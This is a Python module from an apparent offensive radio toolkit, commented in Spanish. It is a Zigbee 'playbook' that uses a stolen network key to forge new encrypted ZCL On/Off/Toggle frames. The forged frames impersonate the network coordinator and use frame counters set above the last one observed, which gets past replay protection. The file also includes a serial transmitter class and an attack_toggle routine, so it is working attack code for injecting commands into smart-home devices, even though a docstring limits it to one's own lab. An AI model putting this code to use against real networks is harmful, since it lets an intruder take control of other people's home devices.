"""Playbook 2 — zcl-injector (automático).

Con la network key robada, fabrica comandos ZCL cifrados NUEVOS (no replay —
el frame counter invalida los paquetes viejos), suplantando al coordinador.

Layout del frame inyectado:
  MAC hdr | NWK hdr (security=1) | NWK aux (SC|FC|src largo|key seq) |
  <APS hdr + ZCL, cifrado AES-CCM con network key || MIC 4B>

ZCL On/Off (cluster 0x0006): FC(1)=0x01 | tsn(1) | cmd(1) → off 0x00 / on 0x01 / toggle 0x02

⚠️ Requiere radio TX (dongle CC2652P/CC1352P7; el firmware sniffer del
CatSniffer V3 es RX). Solo para laboratorio propio.
"""

from __future__ import annotations

import struct

from skyrf.playbooks.crypto_zigbee import build_nonce, ccm_encrypt
from skyrf.playbooks.frames import (
    SEC_CTRL_NWK, aps_header, mac_header, nwk_aux_header, nwk_header,
)

ZCL_CLUSTER_ONOFF = 0x0006
ZCL_CMD_OFF = 0x00
ZCL_CMD_ON = 0x01
ZCL_CMD_TOGGLE = 0x02
PROFILE_HOME_AUTOMATION = 0x0104


def build_zcl_frame(network_key: bytes, *,
                    tc_long_addr: int,
                    nwk_frame_counter: int,   # > último visto en el aire
                    dst_pan: int,
                    short_dst: int,
                    short_src: int = 0x0000,
                    zcl_command: int = ZCL_CMD_TOGGLE,
                    zcl_tsn: int = 1,
                    dst_endpoint: int = 1,
                    src_endpoint: int = 1,
                    cluster: int = ZCL_CLUSTER_ONOFF,
                    seq_mac: int = 1,
                    seq_nwk: int = 1) -> bytes:
    """Construye el frame 802.15.4 crudo con un comando ZCL cifrado (NWK-level)."""
    zcl = bytes([0x01, zcl_tsn & 0xFF, zcl_command & 0xFF])
    aps = aps_header(dst_endpoint, cluster, PROFILE_HOME_AUTOMATION,
                     src_endpoint, seq_nwk & 0xFF)
    plain = aps + zcl

    aux = nwk_aux_header(nwk_frame_counter, tc_long_addr, SEC_CTRL_NWK)
    nonce = build_nonce(tc_long_addr, nwk_frame_counter, SEC_CTRL_NWK)
    encrypted = ccm_encrypt(network_key, nonce, plain, aux)

    return (mac_header(dst_pan, short_dst, short_src, seq_mac)
            + nwk_header(short_dst, short_src, seq_nwk, security=True)
            + aux + encrypted)


def decrypt_injected_for_test(frame: bytes, network_key: bytes) -> bytes | None:
    """Descifra un frame producido por build_zcl_frame (verificación/selftest)."""
    from skyrf.playbooks.frames import parse_mac, parse_nwk_security
    from skyrf.playbooks.crypto_zigbee import ccm_decrypt as _dec

    mac = parse_mac(frame)
    nwk = parse_nwk_security(frame, mac["nwk_off"])
    if not nwk["security"]:
        return None
    aux = frame[mac["nwk_off"] + 8: nwk["payload_off"]]
    nonce = build_nonce(nwk["src_long"], nwk["frame_counter"], nwk["sc"])
    return _dec(network_key, nonce, frame[nwk["payload_off"]:], aux)


class ZCLInjector:
    """Transmisor serie para frames crudos (dongle TX). Formato serie según
    firmware del adaptador — ver PROYECTO.md §2."""

    def __init__(self, port: str, baud: int = 115200):
        self.port = port
        self.baud = baud
        self._ser = None

    def __enter__(self):
        import serial  # pyserial, import diferido
        self._ser = serial.Serial(self.port, self.baud, timeout=1)
        return self

    def __exit__(self, *exc):
        if self._ser:
            self._ser.close()

    def send_raw(self, frame: bytes) -> int:
        if not self._ser:
            raise RuntimeError("inyector sin conexión — usar como context manager")
        return self._ser.write(frame)


def attack_toggle(network_key: bytes, tc_long_addr: int, last_seen_counter: int,
                  dst_pan: int, short_dst: int, count: int = 1) -> list[bytes]:
    """`count` frames Toggle con frame counters estrictamente crecientes."""
    return [
        build_zcl_frame(
            network_key, tc_long_addr=tc_long_addr,
            nwk_frame_counter=last_seen_counter + 1 + i,
            dst_pan=dst_pan, short_dst=short_dst,
            zcl_command=ZCL_CMD_TOGGLE, zcl_tsn=1 + i,
            seq_mac=10 + i, seq_nwk=40 + i,
        )
        for i in range(count)
    ]
